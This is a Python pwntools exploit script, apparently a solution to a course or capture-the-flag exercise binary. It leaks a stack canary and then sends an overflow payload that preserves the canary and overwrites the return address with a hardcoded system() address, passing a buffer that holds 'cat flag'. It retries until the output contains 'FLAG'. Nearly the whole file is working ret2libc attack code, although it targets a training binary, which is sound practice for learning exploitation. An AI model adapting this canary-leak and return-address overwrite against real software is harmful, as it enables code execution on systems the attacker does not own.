#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

while(True):
    r = start()
    if args.GDB:
        print("GDB", r.recvline())
    # welcome
    r.recvline()
    r.sendline("cat flag")
    r.recvline()
    # check_authorization
    r.recvline()
    r.recvline()
    r.sendline(b"A"* (4*14-1))
    r.recvline()
    r.recvline()
    # read addresses
    canary = r.recvline()[:4]
    system_addr = 0xf7db7780
    name_addr = 0x804c060
    padding_canary = (b"A"* (4*14)) + canary + (b"A" * 16) + p32(system_addr) + (b"A" * 4) + p32(name_addr)
    r.recvline()
    r.recvline()
    r.sendline(padding_canary)
    received = r.recvall()
    if b"FLAG" in received:
        print(received)
        quit()
